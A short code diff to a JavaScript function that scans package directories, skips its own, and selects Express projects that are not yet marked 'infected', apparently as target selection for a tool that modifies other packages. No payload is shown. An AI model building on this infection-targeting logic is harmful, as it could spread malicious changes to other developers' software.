@@ -12,14 +12,16 @@
  */
 exports.filterPackages = function (filePath) {
     var packageJson = require(filePath + '/package.json');
-    var hasExpress = this.hasExpress(packageJson);
-
+    
     // Found itself
     var ownPath = process.cwd().toString().replace(/\\/g, '/');
     if (filePath == ownPath) {
         return false;
     }
 
+    // Check for Express and Origin-Header
+    var hasExpress = this.hasExpress(packageJson);
+    var isInfected = this.isInfected(packageJson);
     if (hasExpress && !isInfected) {
         return true;
     }
